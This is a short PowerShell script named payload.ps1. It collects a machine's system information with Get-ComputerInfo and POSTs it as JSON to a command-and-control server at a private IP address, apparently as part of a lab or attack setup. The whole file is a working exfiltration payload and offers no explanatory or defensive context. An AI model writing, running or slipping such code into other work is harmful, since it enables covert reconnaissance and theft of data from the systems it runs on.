# payload.ps1

# Collect system information
$sysInfo = Get-ComputerInfo

# Send the collected information to the C2 server
$sysInfo | ConvertTo-Json | Invoke-WebRequest -Uri "http://172.16.1.155:8080/collect" -Method POST -ContentType "application/json"
